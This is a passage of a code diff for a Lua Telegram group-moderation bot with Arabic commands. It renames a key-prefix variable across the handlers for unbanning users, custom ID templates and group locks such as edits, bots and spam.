+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_,user) DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_,user) DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_,user) DevALI:srem(JENRAL..'ALI:BanAll:',user) DevALI:srem(JENRAL..'ALI:MuteAll:',user)
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_,user) DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_,user) DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_,user) 
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_,user) DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_,user) DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_,user) 
 end  
 end,nil)  
 end
@@ -6910,7 +6898,7 @@ if result and result.type_ and result.type_.channel_ and result.type_.channel_.I
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
 return false  
 end
-if tonumber(result.id_) == tonumber(Jenral) then  
+if tonumber(result.id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙انا البوت وليس لدي قيود', 1, 'md')  
 return false  
 end 
@@ -6922,16 +6910,16 @@ end
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفع قيوده") 
 if SecondSudo(msg) then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_,result.id_) DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_,result.id_) DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_,result.id_) DevALI:srem(Jenral..'ALI:BanAll:',result.id_) DevALI:srem(Jenral..'ALI:MuteAll:',result.id_)
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_,result.id_) DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_,result.id_) DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_,result.id_) DevALI:srem(JENRAL..'ALI:BanAll:',result.id_) DevALI:srem(JENRAL..'ALI:MuteAll:',result.id_)
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_,result.id_) DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_,result.id_) DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_,result.id_) 
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_,result.id_) DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_,result.id_) DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_,result.id_) 
 end
 end,nil)   
 end  
 resolve_username(username,unbanusername) 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if Manager(msg) then
 if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
 local List = {
@@ -7017,76 +7005,76 @@ local List = {
 - ɢᴀᴍᴇ ➥• #game .
 ]]}
 local Text_Rand = List[math.random(#List)]
-DevALI:set(Jenral.."ALI:GpIds:Text"..msg.chat_id_,Text_Rand)
+DevALI:set(JENRAL.."ALI:GpIds:Text"..msg.chat_id_,Text_Rand)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم تغير كليشة الايدي")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if SecondSudo(msg) then
 if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
-DevALI:set("Jenral:New:id:"..Jenral..msg.sender_user_id_,'JenralTEAM')
-return "JenralTEAM"
+DevALI:set("JENRAL:New:id:"..JENRAL..msg.sender_user_id_,'JENRALTEAM')
+return "JENRALTEAM"
 end
-if text and DevALI:get("Jenral:New:id:"..Jenral..msg.sender_user_id_) then 
+if text and DevALI:get("JENRAL:New:id:"..JENRAL..msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
-DevALI:del("Jenral:New:id:"..Jenral..msg.sender_user_id_)
+DevALI:del("JENRAL:New:id:"..JENRAL..msg.sender_user_id_)
 return false
 end
-DevALI:del("Jenral:New:id:"..Jenral..msg.sender_user_id_)
+DevALI:del("JENRAL:New:id:"..JENRAL..msg.sender_user_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الايدي العامه', 1, 'md')
-DevALI:set(Jenral.."ALI:AllIds:Text",text)
+DevALI:set(JENRAL.."ALI:AllIds:Text",text)
 return false
 end
 if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف كليشة الايدي العامه")  
-DevALI:del(Jenral.."ALI:AllIds:Text")
+DevALI:del(JENRAL.."ALI:AllIds:Text")
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
-DevALI:set("Jenral:New:id:"..Jenral..msg.chat_id_..msg.sender_user_id_,'JenralTEAM')
-return "JenralTEAM"
+DevALI:set("JENRAL:New:id:"..JENRAL..msg.chat_id_..msg.sender_user_id_,'JENRALTEAM')
+return "JENRALTEAM"
 end
-if text and Manager(msg) and DevALI:get("Jenral:New:id:"..Jenral..msg.chat_id_..msg.sender_user_id_) then 
+if text and Manager(msg) and DevALI:get("JENRAL:New:id:"..JENRAL..msg.chat_id_..msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
-DevALI:del("Jenral:New:id:"..Jenral..msg.chat_id_..msg.sender_user_id_)
+DevALI:del("JENRAL:New:id:"..JENRAL..msg.chat_id_..msg.sender_user_id_)
 return false
 end
-DevALI:del("Jenral:New:id:"..Jenral..msg.chat_id_..msg.sender_user_id_)
+DevALI:del("JENRAL:New:id:"..JENRAL..msg.chat_id_..msg.sender_user_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الكليشه الجديده', 1, 'md')
-DevALI:set(Jenral.."ALI:GpIds:Text"..msg.chat_id_,text)
+DevALI:set(JENRAL.."ALI:GpIds:Text"..msg.chat_id_,text)
 return false
 end
 if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف كليشة الايدي")  
-DevALI:del(Jenral.."ALI:GpIds:Text"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:GpIds:Text"..msg.chat_id_)
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if msg.reply_to_message_id_ ~= 0 then
 return ""
 else
 if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
-function JenralTEAM(extra,abbas,success)
+function JENRALTEAM(extra,abbas,success)
 if abbas.username_ then username = '@'..abbas.username_ else username = 'لا يوجد' end
 if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
 local function getpro(extra, abbas, success) 
-local msgsday = DevALI:get(Jenral..'ALI:UsersMsgs'..Jenral..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
-local edit_msg = DevALI:get(Jenral..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
-local user_msgs = DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local user_nkt = tonumber(DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
-local cont = (tonumber(DevALI:get(Jenral..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
-local msguser = tonumber(DevALI:get(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
+local msgsday = DevALI:get(JENRAL..'ALI:UsersMsgs'..JENRAL..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local edit_msg = DevALI:get(JENRAL..'ALI:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
+local user_msgs = DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local user_nkt = tonumber(DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
+local cont = (tonumber(DevALI:get(JENRAL..'ALI:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+local msguser = tonumber(DevALI:get(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
 local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بكروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
 local Description = Texting[math.random(#Texting)]
 if abbas.photos_[0] then
-if not DevALI:get(Jenral..'ALI:Lock:Id'..msg.chat_id_) then 
-if not DevALI:get(Jenral..'ALI:Lock:Id:Photo'..msg.chat_id_) then 
-if DevALI:get(Jenral.."ALI:AllIds:Text") then
-newpicid = DevALI:get(Jenral.."ALI:AllIds:Text")
+if not DevALI:get(JENRAL..'ALI:Lock:Id'..msg.chat_id_) then 
+if not DevALI:get(JENRAL..'ALI:Lock:Id:Photo'..msg.chat_id_) then 
+if DevALI:get(JENRAL.."ALI:AllIds:Text") then
+newpicid = DevALI:get(JENRAL.."ALI:AllIds:Text")
 newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
 newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7103,10 +7091,10 @@ newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
 else
 newpicid = "⌁︙"..Description.."\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 end 
-if not DevALI:get(Jenral.."ALI:GpIds:Text"..msg.chat_id_) then 
+if not DevALI:get(JENRAL.."ALI:GpIds:Text"..msg.chat_id_) then 
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
 else 
-local new_id = DevALI:get(Jenral.."ALI:GpIds:Text"..msg.chat_id_)
+local new_id = DevALI:get(JENRAL.."ALI:GpIds:Text"..msg.chat_id_)
 local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
 local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7123,8 +7111,8 @@ local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
 end
 else
-if DevALI:get(Jenral.."ALI:AllIds:Text") then
-newallid = DevALI:get(Jenral.."ALI:AllIds:Text")
+if DevALI:get(JENRAL.."ALI:AllIds:Text") then
+newallid = DevALI:get(JENRAL.."ALI:AllIds:Text")
 newallid = newallid:gsub('#username',(username or 'لا يوجد'))
 newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7141,10 +7129,10 @@ newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
 else
 newallid = "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩"
 end 
-if not DevALI:get(Jenral.."ALI:GpIds:Text"..msg.chat_id_) then
+if not DevALI:get(JENRAL.."ALI:GpIds:Text"..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
 else
-local new_id = DevALI:get(Jenral.."ALI:GpIds:Text"..msg.chat_id_)
+local new_id = DevALI:get(JENRAL.."ALI:GpIds:Text"..msg.chat_id_)
 local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
 local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7165,8 +7153,8 @@ else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل ', 1, 'md')
 end
 else
-if DevALI:get(Jenral.."ALI:AllIds:Text") then
-notpicid = DevALI:get(Jenral.."ALI:AllIds:Text")
+if DevALI:get(JENRAL.."ALI:AllIds:Text") then
+notpicid = DevALI:get(JENRAL.."ALI:AllIds:Text")
 notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
 notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
 notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
@@ -7183,8 +7171,8 @@ notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
 else
 notpicid = "⌁︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 end 
-if not DevALI:get(Jenral..'ALI:Lock:Id'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Lock:Id:Photo'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Id'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Id:Photo'..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
@@ -7194,112 +7182,112 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل', 1, 'md
 end end end
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
 end
-getUser(msg.sender_user_id_, JenralTEAM)
+getUser(msg.sender_user_id_, JENRALTEAM)
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if ChatType == 'sp' or ChatType == 'gp'  then
 if Admin(msg) then
 if text and text:match("^قفل (.*)$") then
 local LockText = {string.match(text, "^(قفل) (.*)$")}
 if LockText[2] == "التعديل" then
-if not DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التعديل")  
-DevALI:set(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
-if not DevALI:get(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل تعديل الميديا")  
-DevALI:set(Jenral..'ALI:Lock:EditMsgs'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:EditMsgs'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفارسيه" then
-if not DevALI:get(Jenral..'ALI:Lock:Farsi'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Farsi'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفارسيه")  
-DevALI:set(Jenral..'ALI:Lock:Farsi'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:Farsi'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفشار" then
-if DevALI:get(Jenral..'ALI:Lock:Fshar'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفشار")  
-DevALI:del(Jenral..'ALI:Lock:Fshar'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Fshar'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الطائفيه" then
-if DevALI:get(Jenral..'ALI:Lock:Taf'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Taf'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الطائفيه")  
-DevALI:del(Jenral..'ALI:Lock:Taf'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Taf'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الكفر" then
-if DevALI:get(Jenral..'ALI:Lock:Kfr'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الكفر")  
-DevALI:del(Jenral..'ALI:Lock:Kfr'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Lock:Kfr'..msg.chat_id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
 end
 end
 if LockText[2] == "الفارسيه بالطرد" then
-if not DevALI:get(Jenral..'ALI:Lock:FarsiBan'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:FarsiBan'..msg.chat_id_) then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل الفارسيه بالطرد")  
-DevALI:set(Jenral..'ALI:Lock:FarsiBan'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Lock:FarsiBan'..msg.chat_id_,true)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
 end
 end
 if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالحذف")  
-DevALI:set(Jenral.."ALI:Lock:Bots"..msg.chat_id_,"del")  
+DevALI:set(JENRAL.."ALI:Lock:Bots"..msg.chat_id_,"del")  
 end
 if LockText[2] == "البوتات بالطرد" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالطرد")  
-DevALI:set(Jenral.."ALI:Lock:Bots"..msg.chat_id_,"kick")  
+DevALI:set(JENRAL.."ALI:Lock:Bots"..msg.chat_id_,"kick")  
 end
 if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل البوتات بالتقيد")  
-DevALI:set(Jenral.."ALI:Lock:Bots"..msg.chat_id_,"ked")  
+DevALI:set(JENRAL.."ALI:Lock:Bots"..msg.chat_id_,"ked")  
 end
 if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
-DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
+DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالحذف")  
 end
 if LockText[2] == "التكرار بالطرد" then 
-DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
+DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالطرد")  
 end
 if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
-DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
+DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالتقيد")  
 end
 if LockText[2] == "التكرار بالكتم" then 
-DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
+DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التكرار بالكتم")  
 end
 if BasicConstructor(msg) then
 if LockText[2] == "التثبيت" then
-if not DevALI:get(Jenral..'ALI:Lock:Pin'..msg.chat_id_) then
-tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevALI:set(Jenral.."ALI:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
+if not DevALI:get(JENRAL..'ALI:Lock:Pin'..msg.chat_id_) then
+tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevALI:set(JENRAL.."ALI:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم قفل التثبيت")  
-DevALI:set(Jenral..'ALI:Lock:Pin'..msg.chat_id_,true)
-DevALI:sadd(Jenral.."ALI:Lock:Pinpin",msg.chat_id_) 
+DevALI:set(JENRAL..'ALI:Lock:Pin'..msg.chat_id_,true)
+DevALI:sadd(JENRAL.."ALI:Lock:Pinpin",msg.chat_id_) 
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
 end end end
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
 local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
@@ -7307,183 +7295,183 @@ if tonumber(TextSpam) < 2 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
-DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
+DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
 end
 end
 if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
 local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
-DevALI:hset(Jenral.."ALI:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
+DevALI:hset(JENRAL.."ALI:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Manager(msg) then
 if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Id:Photo'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Id:Photo'..msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
 else
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الايدي بالصوره'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:Id:Photo'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الايدي بالصوره'
